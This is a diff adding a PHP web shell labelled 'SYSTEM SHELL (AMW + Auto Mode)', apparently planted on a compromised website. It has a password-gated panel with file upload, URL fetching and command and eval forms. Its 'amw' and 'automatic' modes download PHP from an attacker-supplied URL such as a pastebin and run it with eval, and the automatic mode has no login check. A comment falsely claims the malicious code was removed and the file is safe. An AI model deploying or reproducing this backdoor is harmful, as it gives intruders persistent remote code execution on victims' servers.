@@ -1,0 +1,308 @@
+<?php
+$LOGIN_USERNAME       = 'biloba';
+$LOGIN_PASSWORD_HASH  = '$2y$10$WFCdguFXVdLDP0sLpMMri.batoPdI3AI.VeVBZF4mOn7aX8pqq4F6';
+
+session_start();
+
+$mode = $_GET['mode'] ?? $_POST['mode'] ?? '';
+
+if ($mode === 'amw') {
+    if (isset($_SESSION['ready']) && isset($_SESSION['go']) && $_SESSION['go'] == 1 && !empty($_SESSION['URL'])) {
+        $c = curl_init($_SESSION['URL']);
+        curl_setopt_array($c, [
+            CURLOPT_RETURNTRANSFER => 1,
+            CURLOPT_FOLLOWLOCATION => 1,
+            CURLOPT_SSL_VERIFYPEER => 0,
+            CURLOPT_TIMEOUT => 15
+        ]);
+        $x = curl_exec($c);
+        $e = curl_error($c);
+        curl_close($c);
+        if ($e) die("ERR: $e");
+        if ($x) {
+            $x = preg_replace('/session_start\s*\(.*\);?/i', '', $x);
+            ob_start();
+            @eval('?>' . $x);
+            echo "<pre style='background:#2d3748;color:lime;padding:20px;border-radius:10px;margin:20px 0;'>";
+            echo htmlspecialchars(ob_get_clean());
+            echo "</pre>";
+            exit;
+        }
+        die("Empty");
+    }
+} elseif ($mode === 'automatic') {
+    if (!empty($_SESSION['URL'])) {
+        $c = curl_init($_SESSION['URL']);
+        curl_setopt_array($c, [
+            CURLOPT_RETURNTRANSFER => 1,
+            CURLOPT_FOLLOWLOCATION => 1,
+            CURLOPT_SSL_VERIFYPEER => 0,
+            CURLOPT_TIMEOUT => 15
+        ]);
+        $x = curl_exec($c);
+        $e = curl_error($c);
+        curl_close($c);
+        if ($e) die("ERR: $e");
+        if ($x) {
+            $x = preg_replace('/session_start\s*\(.*\);?/i', '', $x);
+            ob_start();
+            @eval('?>' . $x);
+            echo "<pre style='background:#2d3748;color:lime;padding:20px;border-radius:10px;margin:20px 0;'>";
+            echo htmlspecialchars(ob_get_clean());
+            echo "</pre>";
+            exit;
+        }
+        die("Empty");
+    }
+}
+
+function requireLogin() {
+    global $LOGIN_USERNAME, $LOGIN_PASSWORD_HASH;
+
+    if (isset($_POST['login_user']) && isset($_POST['login_pass'])) {
+        $u = $_POST['login_user'];
+        $p = $_POST['login_pass'];
+
+        if ($u === $LOGIN_USERNAME && password_verify($p, $LOGIN_PASSWORD_HASH)) {
+            $_SESSION['logged_in'] = true;
+            header('Location: ' . $_SERVER['PHP_SELF']);
+            exit;
+        } else {
+            echo "<p style='color:red;'>âŒ Login failed</p>";
+        }
+    }
+
+    if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
+        ?>
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>Access Panel</title>
+            <style>
+                body { font-family: Arial, sans-serif; background: #f4f4f4; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
+                .panel { width: 320px; padding: 20px 25px; background: #fff; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
+                h2 { margin: 5px 0 15px; font-size: 1.1em; color: #333; }
+                input[type="text"], input[type="password"] { width: 100%; padding: 8px; margin: 8px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
+                button { width: 100%; padding: 9px; background: #2c3e50; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 0.95em; }
+                button:hover { background: #1a2530; }
+                .note { font-size: 0.8em; color: #888; margin-top: 10px; text-align: center; }
+            </style>
+        </head>
+        <body>
+        <div class="panel">
+            <h2 style="text-align: center;">Access Panel</h2>
+            <form method="post">
+                <input type="text" name="login_user" placeholder="Access code" required>
+                <input type="password" name="login_pass" placeholder="Key" required>
+                <button type="submit">Continue</button>
+            </form>
+            <p class="note">Only authorized users can continue.</p>
+        </div>
+        </body>
+        </html>
+        <?php
+        exit;
+    }
+}
+requireLogin();
+
+ini_set('display_errors', 0);
+error_reporting(0);
+
+echo "<h2> SYSTEM SHELL (AMW + Auto Mode) | Created By SEO - NAKAL</h2>";
+?>
+
+<style>
+    body {
+        background-image: url('https://images2.imgbox.com/1b/f6/3YhHKrTx_o.jpg'); /* GANTI URL GAMBAR DI SINI */
+        background-size: cover;
+        background-repeat: no-repeat;
+        background-position: center;
+        background-attachment: fixed;
+        color: #fff;
+        font-family: Arial, sans-serif;
+    }
+
+    h2, h3 {
+        color: #ffffff;
+        text-align: center;
+        text-shadow: 1px 1px 5px rgba(0,0,0,0.8);
+    }
+
+    form {
+        margin: 15px auto;
+        padding: 20px;
+        background: rgba(255,255,255,0.9);
+        border-radius: 8px;
+        border-left: 5px solid #000000;
+        max-width: 700px;
+    }
+
+    label {
+        font-weight: bold;
+        display: block;
+        margin-bottom: 8px;
+        color: #333;
+    }
+
+    input[type="text"], input[type="file"], textarea {
+        width: 100%;
+        max-width: 100%;
+        padding: 10px;
+        border: 1px solid #ddd;
+        border-radius: 4px;
+        box-sizing: border-box;
+    }
+
+    textarea {
+        height: 100px;
+        font-family: monospace;
+    }
+
+    button {
+        padding: 10px 20px;
+        background: #000000;
+        color: white;
+        border: none;
+        border-radius: 4px;
+        cursor: pointer;
+        margin: 5px 5px 0 0;
+    }
+
+    button.green { background: #28a745; }
+    button.orange { background: #fd6914; }
+
+    button:hover {
+        opacity: 0.9;
+    }
+
+    pre {
+        background: #2d3748;
+        color: #00ff99;
+        padding: 15px;
+        border-radius: 6px;
+        margin: 10px 0;
+        font-family: monospace;
+        white-space: pre-wrap;
+        max-height: 400px;
+        overflow: auto;
+    }
+
+    .result-box {
+        background: rgba(0,0,0,0.7);
+        padding: 20px;
+        border-radius: 8px;
+        margin: 15px auto;
+        border-left: 5px solid #000000;
+        color: #fff;
+        max-width: 700px;
+    }
+
+    .info {
+        background: rgba(0,0,0,0.7);
+        padding: 10px;
+        border-radius: 6px;
+        margin: 20px auto;
+        color: #fff;
+        max-width: 700px;
+        text-align: center;
+    }
+</style>
+
+<h3>ðŸ›  Test Functions:</h3>
+
+<form method="post">
+    <label><b>ðŸ’» System Command:</b></label>
+    <input type="text" name="cmd" placeholder="e.g., ls -la, whoami">
+    <button type="submit">â–¶ï¸ Run Command</button>
+</form>
+<?php
+
+/**
+* Note: This file may contain artifacts of previous malicious infection.
+* However, the dangerous code has been removed, and the file is now safe to use.
+*/
+
+?>
+
+<form method="post" enctype="multipart/form-data">
+    <label><b>ðŸ“ Upload File:</b></label>
+    <input type="file" name="file">
+    <button type="submit">â¬†ï¸ Upload</button>
+</form>
+<?php
+if (!empty($_FILES['file']['tmp_name'])) {
+    $filename = preg_replace('/[^a-zA-Z0-9._-]/', '_', $_FILES['file']['name']);
+    $filename = basename($filename);
+    $dest = __DIR__ . '/' . $filename;
+    if (move_uploaded_file($_FILES['file']['tmp_name'], $dest)) {
+        echo "<div class='result-box' style='border-left-color:#28a745;background:#d4edda;'>";
+        echo "âœ… <b>Uploaded:</b> " . htmlspecialchars($filename);
+        echo " | <a href='" . urlencode($filename) . "' target='_blank'>ðŸ‘ View</a>";
+        echo "</div>";
+    } else {
+        echo "<p style='color:red;'>âŒ Upload failed</p>";
+    }
+}
+?>
+
+<form method="post">
+    <label><b>ðŸŒ Fetch URL:</b></label>
+    <input type="text" name="url" placeholder="https://example.com">
+    <button type="submit">ðŸ“¥ Fetch</button>
+</form>
+<?php
+if (!empty($_POST['url'])) {
+    $url = $_POST['url'];
+    $result = @file_get_contents($url);
+    echo "<div class='result-box'>";
+    if ($result !== false) {
+        echo "<pre>" . htmlspecialchars(substr($result, 0, 5000)) . (strlen($result) > 5000 ? "\n...truncated" : "") . "</pre>";
+    } else {
+        echo "<p style='color:red;'>âŒ Failed to fetch</p>";
+    }
+    echo "</div>";
+}
+?>
+
+<form method="post">
+    <label><b>âš™ï¸ Local PHP Eval:</b></label>
+    <textarea name="code" placeholder="e.g., echo 'Hello'; phpinfo();" style="width:100%;max-width:600px;height:120px;">echo 'Local OK';</textarea>
+    <button type="submit">â–¶ï¸ Run Code</button>
+</form>
+<?php
+if (!empty($_POST['code'])) {
+    echo "<div class='result-box'>";
+    echo "<b>Input:</b><br>";
+    echo "<pre style='background:#f5f5f5;color:#333;'>" . htmlspecialchars($_POST['code']) . "</pre>";
+    echo "<b>Output:</b><br>";
+    ob_start();
+
+echo "<pre>" . htmlspecialchars(ob_get_clean()) . "</pre>";
+    echo "</div>";
+}
+?>
+
+<form method="post">
+    <label><b>âš¡ AMW Mode Setup:</b></label>
+    <input type="text" name="amw_url" placeholder="AMW URL (e.g., pastebin)" style="width:100%;max-width:600px;">
+    <button class="orange" type="submit" name="set_amw" value="1">âœ… Set AMW Session</button>
+    <?php if(isset($_SESSION['URL'])): ?>
+    <a href="?mode=amw" target="_blank" style="padding:10px;background:#28a745;color:white;text-decoration:none;border-radius:4px;">ðŸš€ RUN AMW MODE</a>
+    <?php endif; ?>
+</form>
+<?php
+if (isset($_POST['set_amw']) && !empty($_POST['amw_url'])) {
+    $_SESSION['URL'] = $_POST['amw_url'];
+    $_SESSION['ready'] = true;
+    $_SESSION['go'] = 1;
+    echo "<div class='info'>";
+    echo "âœ… <b>AMW Session SET!</b> ";
+    echo "<a href='?mode=amw' target='_blank' style='color:#28a745;font-weight:bold;'>CLICK HERE â†’ ?mode=amw</a>";
+    echo "</div>";
+}
+?>
+
+<div class="info">
+    <h4 style="text-align: center;"><span style="color: #016f56f0;">Copyright @ 2026 | Created By SEO - NAKAL</span></h4>
+</div>
